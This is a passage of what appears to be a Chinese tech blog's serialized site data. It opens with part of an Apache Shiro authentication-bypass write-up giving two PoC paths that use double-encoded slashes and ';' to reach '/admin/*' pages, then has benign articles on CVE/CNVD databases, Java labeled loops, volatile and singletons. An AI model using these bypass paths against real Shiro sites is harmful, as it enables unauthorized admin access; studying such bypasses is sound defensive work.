/admin/a%25%32%66a——>传入到shiro自动解码一次变成/admin/a%2fa——>经过 decodeRequestString 变成/admin/a/a\n\n由于这里我们的拦截器是map.put("/admin/*", "authc");，这里需要了解一下shiro的URL是ant格式，路径是支持通配符表示的。\n\n * ?：匹配一个字符\n * *：匹配零个或多个字符串\n * **：匹配路径中的零个或多个路径\n\n第2种情况成功利用需要下面的条件\n\n> 应用不能部署在根目录，也就是需要context-path，server.servlet.context-path=/test，如果为根目录则context-path为空，就会被CVE-2020-1957的patch将URL格式化，值得注意的是若Shiro版本小于1.5.2的话那么该条件就不需要。',normalizedContent:'这里的 shiro 拦截器需要设置成map.put("/admin/*", "authc"); 这里有两种poc，都是可以绕过\n\n * admin/a%25%32%66a\n * /;/admin/aaa\n\n第一种情况\n\n> /admin/a%25%32%66a——>传入到shiro自动解码一次变成/admin/a%2fa——>经过 decoderequeststring 变成/admin/a/a\n\n由于这里我们的拦截器是map.put("/admin/*", "authc");，这里需要了解一下shiro的url是ant格式，路径是支持通配符表示的。\n\n * ?：匹配一个字符\n * *：匹配零个或多个字符串\n * **：匹配路径中的零个或多个路径\n\n第2种情况成功利用需要下面的条件\n\n> 应用不能部署在根目录，也就是需要context-path，server.servlet.context-path=/test，如果为根目录则context-path为空，就会被cve-2020-1957的patch将url格式化，值得注意的是若shiro版本小于1.5.2的话那么该条件就不需要。',charsets:{cjk:!0},lastUpdated:"2022/04/17, 22:54:59",lastUpdatedTimestamp:1650207299e3},{title:"浅谈漏洞来源(CVE,NVD,CNVD,CNNVD)",frontmatter:{title:"浅谈漏洞来源(CVE,NVD,CNVD,CNNVD)",date:"2022-04-17T17:48:54.000Z",permalink:"/pages/f26408/",categories:["安全"],tags:[null],author:{name:"kehao",link:"https://github.com/chenkehao1998"}},regularPath:"/03.%E5%AE%89%E5%85%A8/02.%E6%B5%85%E8%B0%88%E6%BC%8F%E6%B4%9E%E6%9D%A5%E6%BA%90(CVE,NVD,CNVD,CNNVD).html",relativePath:"03.安全/02.浅谈漏洞来源(CVE,NVD,CNVD,CNNVD).md",key:"v-5e38753e",path:"/pages/f26408/",headersStr:null,content:"网络安全人士可能会问这样一个问题，安全漏洞是哪里来的，什么渠道，可靠吗。那么多的安全产品，他们的漏洞库都是自己整理的吗？（怎么可能撒），虽然各安全厂商都搞自己的威胁情报中心，但是威胁情报除了自研的，很多还是靠类似公益的机构来支持，比如业界大家都知道的几个平台，我们就简单和大家掰扯掰扯吧。\n\n头部的安全厂商会搞自己的漏洞收集平台，也有项目形式的，比如国外的CVE,NVD和国内的CNVD,CNNVD。重点说说CVE吧。\n\nCVE:英文全称是“Common Vulnerabilities & Exposures” 通用漏洞披露。CVE就好像是一个字典表，为广泛认同的信息安全漏洞或者已经暴露出来的弱点给出一个公共的名称。使用一个共同的名字，可以帮助用户在各自独立的各种漏洞数据库中和漏洞评估工具中共享数据。这样就使得CVE成为了安全信息共享的“关键字”。如果在一个漏洞报告中指明一个漏洞，如果有CVE名称，你就可以快速地在任何其它CVE兼容的数据库中找到相应修补的信息，解决安全问题。其使命是为了能更加快速而有效地鉴别、发现和修复软件产品的安全漏洞。\n\n官网： http://cve.mitre.org/\n\n为什么会有CVE:  各个安全厂家在阐述自己产品的水平时，都会声称自己的扫描漏洞数最多，你说有1000种，我说有5000。直接比较他们的数据库是很困难的，也不科学，但是用户如何辨别？不同的厂家在入侵手法和漏洞这方面的知识库各有千秋，用户如何最大限度地获得所有安全信息？CVE就是在这样的环境下应运而生的。现在的安全工具，比如漏扫，都支持或者兼容CVE漏洞，就是CVE里有的漏洞，它都能作为漏洞库进行检测。\n\nCVE的特点：\n\n * - 为每个漏洞和暴露确定了唯一的名称\n * - 给每个漏洞和暴露一个标准化的描述\n * - 不是一个数据库，而是一个字典\n * - 任何完全迥异的漏洞库都可以用同一个语言表述\n * - 由于语言统一，可以使得安全事件报告更好地被理解，实现更好的协同工作\n * - 可以成为评价相应工具和数据库的基准\n * - 非常容易从互联网查询和下载，\n * - 通过“CVE编辑部”体现业界的认可\n\n（CVE 的编辑部成员包括了各种各样的有关信息安全的组织，包括：安全厂商，学术界，研究机构，政府机构还有一些卓越的安全专家。通过开放和合作式的讨论，编辑部决定哪些漏洞和暴露要包含进CVE，并且确定每个条目的公共名称和描述。）\n\nCVE的命名：\n\n命名过程从发现一个潜在的安全漏洞开始；首先赋予一个CVE候选号码；接着，编辑部会讨论该候选条目能否成为一个CVE条目；如果候选条目被投票通过，该条目会加进CVE，并且公布在CVE网站上。\n\n我们结合某一产品举个例子吧。\n\n这个是某安全工具里的漏洞检测功能，此处它提示检车到某IP地址的漏洞，就是符合CVE-2009-1172的描述。那么用户如果想知道详细的改漏洞的描述或者信息，可以在CVE的官网查阅，比如下图\n\n在CVE的官方网站可以查阅到收录的各种漏洞，目前已经快15万条了。\n\n关于漏洞的详细描述，网站上有相关信息，包括该漏洞在其他平台组织的编号信息等。也就是同一个漏洞，在不同的组织中被命名或编号是不同的，但是他们说的是同一个漏洞。\n\n除了CVE，著名的再就是NVD（美国国家通用漏洞数据库）和CNVD,NNVD了。\n\nCNVD: 国家信息安全漏洞共享平台（China National Vulnerability Database）https://www.cnvd.org.cn/\n\n由国家计算机网络应急技术处理协调中心（中文简称国家互联应急中心，英文简称CNCERT）联合国内重要信息系统单位、基础电信运营商、网络安全厂商、软件厂商和互联网企业建立的国家网络安全漏洞库。\n\nCNNVD : 国家信息安全漏洞库  http://www.cnnvd.org.cn/web/index.html\n\nCNNVD是中国国家信息安全漏洞库，英文名称“China National Vulnerability Database of Information Security”，简称“CNNVD”，隶属于中国信息安全测评中心(一般简称国测，国测的主管单位是Security部)，是中国信息安全测评中心为切实履行漏洞分析和风险评估的职能，负责建设运维的国家级信息安全漏洞库，为我国信息安全保障提供基础服务。\n\n详细内容，可以点进去看看，但是今天这个网站，点了就报错，估计也经常被攻击吧。\n\n其他就不多说了，多是一些安全厂商自建的平台，可以理解为第三方众测平台吧。感觉第三方这种的含金量要差一些，没有CVE等那么高质量吧。毕竟CVE的申请过程也比较麻烦。",normalizedContent:"网络安全人士可能会问这样一个问题，安全漏洞是哪里来的，什么渠道，可靠吗。那么多的安全产品，他们的漏洞库都是自己整理的吗？（怎么可能撒），虽然各安全厂商都搞自己的威胁情报中心，但是威胁情报除了自研的，很多还是靠类似公益的机构来支持，比如业界大家都知道的几个平台，我们就简单和大家掰扯掰扯吧。\n\n头部的安全厂商会搞自己的漏洞收集平台，也有项目形式的，比如国外的cve,nvd和国内的cnvd,cnnvd。重点说说cve吧。\n\ncve:英文全称是“common vulnerabilities & exposures” 通用漏洞披露。cve就好像是一个字典表，为广泛认同的信息安全漏洞或者已经暴露出来的弱点给出一个公共的名称。使用一个共同的名字，可以帮助用户在各自独立的各种漏洞数据库中和漏洞评估工具中共享数据。这样就使得cve成为了安全信息共享的“关键字”。如果在一个漏洞报告中指明一个漏洞，如果有cve名称，你就可以快速地在任何其它cve兼容的数据库中找到相应修补的信息，解决安全问题。其使命是为了能更加快速而有效地鉴别、发现和修复软件产品的安全漏洞。\n\n官网： http://cve.mitre.org/\n\n为什么会有cve:  各个安全厂家在阐述自己产品的水平时，都会声称自己的扫描漏洞数最多，你说有1000种，我说有5000。直接比较他们的数据库是很困难的，也不科学，但是用户如何辨别？不同的厂家在入侵手法和漏洞这方面的知识库各有千秋，用户如何最大限度地获得所有安全信息？cve就是在这样的环境下应运而生的。现在的安全工具，比如漏扫，都支持或者兼容cve漏洞，就是cve里有的漏洞，它都能作为漏洞库进行检测。\n\ncve的特点：\n\n * - 为每个漏洞和暴露确定了唯一的名称\n * - 给每个漏洞和暴露一个标准化的描述\n * - 不是一个数据库，而是一个字典\n * - 任何完全迥异的漏洞库都可以用同一个语言表述\n * - 由于语言统一，可以使得安全事件报告更好地被理解，实现更好的协同工作\n * - 可以成为评价相应工具和数据库的基准\n * - 非常容易从互联网查询和下载，\n * - 通过“cve编辑部”体现业界的认可\n\n（cve 的编辑部成员包括了各种各样的有关信息安全的组织，包括：安全厂商，学术界，研究机构，政府机构还有一些卓越的安全专家。通过开放和合作式的讨论，编辑部决定哪些漏洞和暴露要包含进cve，并且确定每个条目的公共名称和描述。）\n\ncve的命名：\n\n命名过程从发现一个潜在的安全漏洞开始；首先赋予一个cve候选号码；接着，编辑部会讨论该候选条目能否成为一个cve条目；如果候选条目被投票通过，该条目会加进cve，并且公布在cve网站上。\n\n我们结合某一产品举个例子吧。\n\n这个是某安全工具里的漏洞检测功能，此处它提示检车到某ip地址的漏洞，就是符合cve-2009-1172的描述。那么用户如果想知道详细的改漏洞的描述或者信息，可以在cve的官网查阅，比如下图\n\n在cve的官方网站可以查阅到收录的各种漏洞，目前已经快15万条了。\n\n关于漏洞的详细描述，网站上有相关信息，包括该漏洞在其他平台组织的编号信息等。也就是同一个漏洞，在不同的组织中被命名或编号是不同的，但是他们说的是同一个漏洞。\n\n除了cve，著名的再就是nvd（美国国家通用漏洞数据库）和cnvd,nnvd了。\n\ncnvd: 国家信息安全漏洞共享平台（china national vulnerability database）https://www.cnvd.org.cn/\n\n由国家计算机网络应急技术处理协调中心（中文简称国家互联应急中心，英文简称cncert）联合国内重要信息系统单位、基础电信运营商、网络安全厂商、软件厂商和互联网企业建立的国家网络安全漏洞库。\n\ncnnvd : 国家信息安全漏洞库  http://www.cnnvd.org.cn/web/index.html\n\ncnnvd是中国国家信息安全漏洞库，英文名称“china national vulnerability database of information security”，简称“cnnvd”，隶属于中国信息安全测评中心(一般简称国测，国测的主管单位是security部)，是中国信息安全测评中心为切实履行漏洞分析和风险评估的职能，负责建设运维的国家级信息安全漏洞库，为我国信息安全保障提供基础服务。\n\n详细内容，可以点进去看看，但是今天这个网站，点了就报错，估计也经常被攻击吧。\n\n其他就不多说了，多是一些安全厂商自建的平台，可以理解为第三方众测平台吧。感觉第三方这种的含金量要差一些，没有cve等那么高质量吧。毕竟cve的申请过程也比较麻烦。",charsets:{cjk:!0},lastUpdated:"2022/04/17, 22:54:59",lastUpdatedTimestamp:1650207299e3},{title:"目录",frontmatter:{pageComponent:{name:"Catalogue",data:{path:"03.安全",imgUrl:"/img/catalog.png",description:"安全知识"}},title:"目录",date:"2022-04-17T21:48:12.000Z",permalink:"/safe/",sidebar:!0,article:!1,comment:!1,editLink:!1,author:{name:"kehao",link:"https://github.com/chenkehao1998"}},regularPath:"/03.%E5%AE%89%E5%85%A8/catalog.html",relativePath:"03.安全/catalog.md",key:"v-120e30c7",path:"/safe/",headersStr:null,content:"",normalizedContent:"",charsets:{},lastUpdated:"2022/04/17, 22:54:59",lastUpdatedTimestamp:1650207299e3},{title:"java retry_详解",frontmatter:{title:"java retry_详解",date:"2022-04-17T22:22:39.000Z",permalink:"/pages/da78ec/",categories:["java"],tags:[null],author:{name:"kehao",link:"https://github.com/chenkehao1998"}},regularPath:"/04.java/01.%E5%9F%BA%E7%A1%80/01.java%20retry_%E8%AF%A6%E8%A7%A3.html",relativePath:"04.java/01.基础/01.java retry_详解.md",key:"v-317592a9",path:"/pages/da78ec/",headers:[{level:2,title:"发现",slug:"发现",normalizedTitle:"发现",charIndex:2},{level:2,title:"验证",slug:"验证",normalizedTitle:"验证",charIndex:80},{level:2,title:"揭秘",slug:"揭秘",normalizedTitle:"揭秘",charIndex:1093},{level:2,title:"启发",slug:"启发",normalizedTitle:"启发",charIndex:1905},{level:2,title:"总结",slug:"总结",normalizedTitle:"总结",charIndex:2806}],headersStr:"发现 验证 揭秘 启发 总结",content:'# 发现\n\n今天在探秘线程池原理知识点，在阅读JDK源码时遇到程序代码中出现如下代码，因为之前没有遇到过，于是特地记录下来并谷歌了一番，后面我自己做了一些简要的验证和分析。\n\n\n# 验证\n\n这retry就是一个标记，标记对一个循环方法的操作（continue和break）处理点，功能类似于goto，所以retry一般都是伴随着for循环出现，retry:标记的下一行就是for循环，在for循环里面调用continue（或者break）再紧接着retry标记时，就表示从这个地方开始执行continue（或者break）操作，具体我们来看看下面的例子：\n\n 1. 使用continue跳出循环的操作：\n\npublic static void testContinue() {\n    retry:\n    for(int i = 0; i < 3; i++) {\n        for(int j = 0; j < 5; j++) {\n            System.out.print(j + ", ");\n            if(j == 3) {\n                continue retry;\n            }\n        }\n    }\n    System.out.print(" >>> OK");\n}\n// 输出：0, 1, 2, 3, 0, 1, 2, 3, 0, 1, 2, 3,  >>> OK\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n\n\n2、使用break跳出循环的操作：\n\npublic static void testBreak() {\n    retry:\n    for(int i = 0; i < 3; i++) {\n        for(int j = 0; j < 5; j++) {\n            System.out.print(j + ", ");\n            if(j == 3) {\n                break retry;\n            }\n        }\n    }\n    System.out.print(" >>> OK");\n}\n// 输出：0, 1, 2, 3,  >>> OK\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n\n\n从上面的两个例子可以看出，在内层循环里面调用continue（或者break）后接着retry标识符，程序直接转到最外层for循环去处理了。\n\n\n# 揭秘\n\n我多想了一下，这个retry标记的使用原理是什么样的？于是我扒了扒上面程序的反编译代码，希望能够从中找到答案：\n\npublic static void testContinue()\n  {\n    for (int i = 0; i < 3; i++) {\n      for (int j = 0; j < 5; j++)\n      {\n        System.out.print(j + ", ");\n        if (j == 3) {\n          break;\n        }\n      }\n    }\n    System.out.print(" >>> OK");\n  }\n\npublic static void testBreak() {\n\tlabel22:\n\tfor(int i = 0; i < 3; ++i) {\n\t\tfor(int j = 0; j < 5; ++j) {\n\t\t\tSystem.out.print(j + ", ");\n\t\t\tif (j == 3) {\n\t\t\t\tbreak label22;\n\t\t\t}\n\t\t}\n\t}\n\n\tSystem.out.print(" >>> OK");\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n\n\n很明显，编译的时候编译器自动按照程序逻辑转换成了我们日常使用的方式来处理，比如continue的语句则翻译成了break，而下面的break方法同样使用了标记位，只是顺序不同了而已，这和程序执行的逻辑顺序应该是有关系的，显然编译器很聪明，如果你不加for循环下面的那一个关于OK的打印语句，编译器就直接把break retry；转换成了return； 语句，说明编译器已经知道在这里根据逻辑来判断和处理了。\n\n\n# 启发\n\n这一个标记的作用，给了我们一点点启发，因为平时好像都没有怎么见到过这个使用方法，但是类似跳出多重循环的场景却不在少数，看看以前我们都是怎么样处理的。\n\n1、跳出里面的for循环，继续从外面for循环开始执行：\n\npublic static void testContinueR() {\n    for(int i = 0; i < 3; i++) {\n        for(int j = 0; j < 5; j++) {\n            System.out.print(j + ", ");\n            if(j == 3) {\n                break;\n            }\n        }\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n\n\n使用break直接结束里面这一层循环，然后从外出for循环继续开始。\n\n2、跳出里外两层循环，直接往下执行逻辑：\n\npublic static void testBreakR() {\n    boolean flag = false;\n    for(int i = 0; i < 3; i++) {\n        for(int j = 0; j < 5; j++) {\n            System.out.print(j + ", ");\n            if(j == 3) {\n                flag = true;\n                break;\n            }\n        }\n        if(flag) {\n            break;\n        }\n    }\n    System.out.println(" >>> OK");\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n\n\n其实这里有两种情况，如果for循环后面没有内容了，可以直接在最里层循环执行return语句，如果后面还有其他逻辑执行，那么可以使用标记位辅助。\n\n\n# 总结\n\n如果你现在积累到了这个retry标记的用法，这个地方就可以更加灵活的处理了，可以不用写那么多的辅助代码，还有一点需要提一下，其实这个retry标识符不是指定的，只要任意符合Java变量命名的标识符都可以，只要后面接上英文冒号就行了。\n\npublic static void testOtherFlag() {\n    abc:\n    for(int i = 0; i < 3; i++) {\n        for(int j = 0; j < 5; j++) {\n            System.out.print(j + ", ");\n            if(j == 3) {\n                break abc;\n            }\n        }\n    }\n}\n\n// 输出：0, 1, 2, 3,\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n\n\n其实和goto有同样争议的是，在过于复杂的循环程序里面使用这个标记，可能会降低程序的可读性，所以在使用之前，还是需要自己权衡。',normalizedContent:'# 发现\n\n今天在探秘线程池原理知识点，在阅读jdk源码时遇到程序代码中出现如下代码，因为之前没有遇到过，于是特地记录下来并谷歌了一番，后面我自己做了一些简要的验证和分析。\n\n\n# 验证\n\n这retry就是一个标记，标记对一个循环方法的操作（continue和break）处理点，功能类似于goto，所以retry一般都是伴随着for循环出现，retry:标记的下一行就是for循环，在for循环里面调用continue（或者break）再紧接着retry标记时，就表示从这个地方开始执行continue（或者break）操作，具体我们来看看下面的例子：\n\n 1. 使用continue跳出循环的操作：\n\npublic static void testcontinue() {\n    retry:\n    for(int i = 0; i < 3; i++) {\n        for(int j = 0; j < 5; j++) {\n            system.out.print(j + ", ");\n            if(j == 3) {\n                continue retry;\n            }\n        }\n    }\n    system.out.print(" >>> ok");\n}\n// 输出：0, 1, 2, 3, 0, 1, 2, 3, 0, 1, 2, 3,  >>> ok\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n\n\n2、使用break跳出循环的操作：\n\npublic static void testbreak() {\n    retry:\n    for(int i = 0; i < 3; i++) {\n        for(int j = 0; j < 5; j++) {\n            system.out.print(j + ", ");\n            if(j == 3) {\n                break retry;\n            }\n        }\n    }\n    system.out.print(" >>> ok");\n}\n// 输出：0, 1, 2, 3,  >>> ok\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n\n\n从上面的两个例子可以看出，在内层循环里面调用continue（或者break）后接着retry标识符，程序直接转到最外层for循环去处理了。\n\n\n# 揭秘\n\n我多想了一下，这个retry标记的使用原理是什么样的？于是我扒了扒上面程序的反编译代码，希望能够从中找到答案：\n\npublic static void testcontinue()\n  {\n    for (int i = 0; i < 3; i++) {\n      for (int j = 0; j < 5; j++)\n      {\n        system.out.print(j + ", ");\n        if (j == 3) {\n          break;\n        }\n      }\n    }\n    system.out.print(" >>> ok");\n  }\n\npublic static void testbreak() {\n\tlabel22:\n\tfor(int i = 0; i < 3; ++i) {\n\t\tfor(int j = 0; j < 5; ++j) {\n\t\t\tsystem.out.print(j + ", ");\n\t\t\tif (j == 3) {\n\t\t\t\tbreak label22;\n\t\t\t}\n\t\t}\n\t}\n\n\tsystem.out.print(" >>> ok");\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n\n\n很明显，编译的时候编译器自动按照程序逻辑转换成了我们日常使用的方式来处理，比如continue的语句则翻译成了break，而下面的break方法同样使用了标记位，只是顺序不同了而已，这和程序执行的逻辑顺序应该是有关系的，显然编译器很聪明，如果你不加for循环下面的那一个关于ok的打印语句，编译器就直接把break retry；转换成了return； 语句，说明编译器已经知道在这里根据逻辑来判断和处理了。\n\n\n# 启发\n\n这一个标记的作用，给了我们一点点启发，因为平时好像都没有怎么见到过这个使用方法，但是类似跳出多重循环的场景却不在少数，看看以前我们都是怎么样处理的。\n\n1、跳出里面的for循环，继续从外面for循环开始执行：\n\npublic static void testcontinuer() {\n    for(int i = 0; i < 3; i++) {\n        for(int j = 0; j < 5; j++) {\n            system.out.print(j + ", ");\n            if(j == 3) {\n                break;\n            }\n        }\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n\n\n使用break直接结束里面这一层循环，然后从外出for循环继续开始。\n\n2、跳出里外两层循环，直接往下执行逻辑：\n\npublic static void testbreakr() {\n    boolean flag = false;\n    for(int i = 0; i < 3; i++) {\n        for(int j = 0; j < 5; j++) {\n            system.out.print(j + ", ");\n            if(j == 3) {\n                flag = true;\n                break;\n            }\n        }\n        if(flag) {\n            break;\n        }\n    }\n    system.out.println(" >>> ok");\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n\n\n其实这里有两种情况，如果for循环后面没有内容了，可以直接在最里层循环执行return语句，如果后面还有其他逻辑执行，那么可以使用标记位辅助。\n\n\n# 总结\n\n如果你现在积累到了这个retry标记的用法，这个地方就可以更加灵活的处理了，可以不用写那么多的辅助代码，还有一点需要提一下，其实这个retry标识符不是指定的，只要任意符合java变量命名的标识符都可以，只要后面接上英文冒号就行了。\n\npublic static void testotherflag() {\n    abc:\n    for(int i = 0; i < 3; i++) {\n        for(int j = 0; j < 5; j++) {\n            system.out.print(j + ", ");\n            if(j == 3) {\n                break abc;\n            }\n        }\n    }\n}\n\n// 输出：0, 1, 2, 3,\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n\n\n其实和goto有同样争议的是，在过于复杂的循环程序里面使用这个标记，可能会降低程序的可读性，所以在使用之前，还是需要自己权衡。',charsets:{cjk:!0},lastUpdated:"2022/04/18, 00:47:23",lastUpdatedTimestamp:1650214043e3},{title:"java_volalite关键字",frontmatter:{title:"java_volalite关键字",date:"2022-04-17T22:22:39.000Z",permalink:"/pages/225f1b/",categories:["java","基础"],tags:[null],author:{name:"kehao",link:"https://github.com/chenkehao1998"}},regularPath:"/04.java/01.%E5%9F%BA%E7%A1%80/03.java_volalite%E5%85%B3%E9%94%AE%E5%AD%97.html",relativePath:"04.java/01.基础/03.java_volalite关键字.md",key:"v-43a2d958",path:"/pages/225f1b/",headers:[{level:2,title:"作用",slug:"作用",normalizedTitle:"作用",charIndex:2},{level:3,title:"1. 防止指令重排",slug:"_1-防止指令重排",normalizedTitle:"1. 防止指令重排",charIndex:7},{level:3,title:"2. 解决可见性问题",slug:"_2-解决可见性问题",normalizedTitle:"2. 解决可见性问题",charIndex:18},{level:4,title:"2.1 volalite怎么解决可见性问题？",slug:"_2-1-volalite怎么解决可见性问题",normalizedTitle:"2.1 volalite怎么解决可见性问题？",charIndex:604},{level:2,title:"volalite使用的实际案例",slug:"volalite使用的实际案例",normalizedTitle:"volalite使用的实际案例",charIndex:1060}],headersStr:"作用 1. 防止指令重排 2. 解决可见性问题 2.1 volalite怎么解决可见性问题？ volalite使用的实际案例",content:"# 作用\n\n 1. 防止指令重排\n 2. 解决可见性问题\n\n\n# 1. 防止指令重排\n\n重排序：为了提高性能，编译器和处理器常常会对既定的代码执行顺序进行指令重排序。\n\n重排序的类型有哪些呢？源码到最终执行会经过哪些重排序呢？\n\n一般重排序可以分为如下三种：\n\n * 编译器优化的重排序。编译器在不改变单线程程序语义的前提下，可以重新安排语句的执行顺序;\n * 指令级并行的重排序。现代处理器采用了指令级并行技术来将多条指令重叠执行。如果不存在数据依赖性，处理器可以改变语句对应机器指令的执行顺序;\n * 内存系统的重排序。由于处理器使用缓存和读/写缓冲区，这使得加载和存储操作看上去可能是在乱序执行的。\n\nVolatile是通过内存屏障 内存屏障 来保证不被重排序的\n\njava编译器会在生成指令系列时在适当的位置会插入内存屏障指令来禁止特定类型的处理器重排序。\n\n为了实现volatile的内存语义，JMM会限制特定类型的编译器和处理器重排序，JMM会针对编译器制定volatile重排序规则表：\n\n> 图中NO 代表 不重排序 需要注意的是：volatile写是在前面和后面分别插入内存屏障，而volatile读操作是在后面插入两个内存屏障。 如图： 写: 读：\n\n\n# 2. 解决可见性问题\n\n解决可见性问题的两种方法\n\n 1. 加锁 为啥加锁可以解决可见性问题呢？\n 2. volalite\n\n# 2.1 volalite怎么解决可见性问题？\n\n每个线程操作数据的时候会把数据从主内存读取到自己的工作内存，如果他操作了数据并且写回了，其他已经读取的线程的变量副本就会失效了，需要都数据进行操作又要再次去主内存中读取了。\n\nvolatile保证不同线程对共享变量操作的可见性，也就是说一个线程修改了volatile修饰的变量，当修改写回主内存时，另外一个线程立即看到最新的值。\n\n当多个处理器的运算任务都涉及同一块主内存区域时，将可能导致各自的缓存数据不一致，举例说明变量在多个CPU之间的共享\n\n为了解决一致性的问题，需要各个处理器访问缓存时都遵循一些协议，在读写时要根据协议来进行操作，这类协议有MSI、MESI（IllinoisProtocol）、MOSI、Synapse、Firefly及DragonProtocol等。 MESI（缓存一致性协议）\n\n所以不要大量使用Volatile，因为大量使用volalite会引起总线风暴。至于什么时候去使用Volatile什么时候使用锁，根据场景区分。\n\n\n# volalite使用的实际案例\n\n 1. java:双重检查 线程安全的懒汉式单例模式",normalizedContent:"# 作用\n\n 1. 防止指令重排\n 2. 解决可见性问题\n\n\n# 1. 防止指令重排\n\n重排序：为了提高性能，编译器和处理器常常会对既定的代码执行顺序进行指令重排序。\n\n重排序的类型有哪些呢？源码到最终执行会经过哪些重排序呢？\n\n一般重排序可以分为如下三种：\n\n * 编译器优化的重排序。编译器在不改变单线程程序语义的前提下，可以重新安排语句的执行顺序;\n * 指令级并行的重排序。现代处理器采用了指令级并行技术来将多条指令重叠执行。如果不存在数据依赖性，处理器可以改变语句对应机器指令的执行顺序;\n * 内存系统的重排序。由于处理器使用缓存和读/写缓冲区，这使得加载和存储操作看上去可能是在乱序执行的。\n\nvolatile是通过内存屏障 内存屏障 来保证不被重排序的\n\njava编译器会在生成指令系列时在适当的位置会插入内存屏障指令来禁止特定类型的处理器重排序。\n\n为了实现volatile的内存语义，jmm会限制特定类型的编译器和处理器重排序，jmm会针对编译器制定volatile重排序规则表：\n\n> 图中no 代表 不重排序 需要注意的是：volatile写是在前面和后面分别插入内存屏障，而volatile读操作是在后面插入两个内存屏障。 如图： 写: 读：\n\n\n# 2. 解决可见性问题\n\n解决可见性问题的两种方法\n\n 1. 加锁 为啥加锁可以解决可见性问题呢？\n 2. volalite\n\n# 2.1 volalite怎么解决可见性问题？\n\n每个线程操作数据的时候会把数据从主内存读取到自己的工作内存，如果他操作了数据并且写回了，其他已经读取的线程的变量副本就会失效了，需要都数据进行操作又要再次去主内存中读取了。\n\nvolatile保证不同线程对共享变量操作的可见性，也就是说一个线程修改了volatile修饰的变量，当修改写回主内存时，另外一个线程立即看到最新的值。\n\n当多个处理器的运算任务都涉及同一块主内存区域时，将可能导致各自的缓存数据不一致，举例说明变量在多个cpu之间的共享\n\n为了解决一致性的问题，需要各个处理器访问缓存时都遵循一些协议，在读写时要根据协议来进行操作，这类协议有msi、mesi（illinoisprotocol）、mosi、synapse、firefly及dragonprotocol等。 mesi（缓存一致性协议）\n\n所以不要大量使用volatile，因为大量使用volalite会引起总线风暴。至于什么时候去使用volatile什么时候使用锁，根据场景区分。\n\n\n# volalite使用的实际案例\n\n 1. java:双重检查 线程安全的懒汉式单例模式",charsets:{cjk:!0},lastUpdated:"2022/04/18, 00:47:23",lastUpdatedTimestamp:1650214043e3},{title:"java_双重检查 线程安全的懒汉式单例模式",frontmatter:{title:"java_双重检查 线程安全的懒汉式单例模式",date:"2022-04-17T22:22:39.000Z",permalink:"/pages/2b7746/",categories:["java"],tags:[null],author:{name:"kehao",link:"https://github.com/chenkehao1998"}},regularPath:"/04.java/01.%E5%9F%BA%E7%A1%80/02.java_%E5%8F%8C%E9%87%8D%E6%A3%80%E6%9F%A5%20%E7%BA%BF%E7%A8%8B%E5%AE%89%E5%85%A8%E7%9A%84%E6%87%92%E6%B1%89%E5%BC%8F%E5%8D%95%E4%BE%8B%E6%A8%A1%E5%BC%8F.html",relativePath:"04.java/01.基础/02.java_双重检查 线程安全的懒汉式单例模式.md",key:"v-3631b24f",path:"/pages/2b7746/",headersStr:null,content:"public class Singleton {\n\n    private static volatile Singleton singleton;\n\n    private Singleton() {}\n\n    public static Singleton getInstance() {\n        if (singleton == null) {\n            synchronized (Singleton.class) {\n                if (singleton == null) {\n                    singleton = new Singleton();\n                }\n            }\n        }\n        return singleton;\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n",normalizedContent:"public class singleton {\n\n    private static volatile singleton singleton;\n\n    private singleton() {}\n\n    public static singleton getinstance() {\n        if (singleton == null) {\n            synchronized (singleton.class) {\n                if (singleton == null) {\n                    singleton = new singleton();\n                }\n            }\n        }\n        return singleton;\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n",charsets:{},lastUpdated:"2022/04/18, 00:47:23",lastUpdatedTimestamp:1650214043e3},{title:"Java基础—break label 带标签的break语句的用法",frontmatter:{title:"Java基础—break label 带标签的break语句的用法",date:"2022-04-17T22:22:39.000Z",permalink:"/pages/b5180a/",categories:["java"],tags:[null],author:{name:"kehao",link:"https://github.com/chenkehao1998"}},regularPath:"/04.java/01.%E5%9F%BA%E7%A1%80/04.Java%E5%9F%BA%E7%A1%80%E2%80%94break%20label%20%E5%B8%A6%E6%A0%87%E7%AD%BE%E7%9A%84break%E8%AF%AD%E5%8F%A5%E7%9A%84%E7%94%A8%E6%B3%95.html",relativePath:"04.java/01.基础/04.Java基础—break label 带标签的break语句的用法.md",key:"v-18dd19f6",path:"/pages/b5180a/",headersStr:null,content:' * 是这样的，今天看RocketMQ的Client的时候，里面出现了一个写Java没有看到过的东西 - - 记录一下。\n * 也是就是带标签的break； RocketMQ的Client中的使用\n\n`while(true) {\n\tlabel122: {\n\t  switch(communicationMode) {\n\t\t\tcase ASYNC:\n\t\t\t\treturn null;\n\t\t\tcase ONEWAY:\n\t\t\t\treturn null;\n\t\t\tcase SYNC:\n\t\t\t\tif () {\n\t\t\t\t\treturn sendResult;\n\t\t\t\t}\n\t\t\tdefault:\n\t\t\t\tbreak label122;\n\t\t}\n\t}\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n\n * 其实很容易理解：就是标记代码块为label122 当执行到default的时候break到代码块执行。\n * 怎么用呢？\n\npublic class Main {\n    public static void main(String[] args) {\n        label1:\n        for (int i = 0; i < 10; 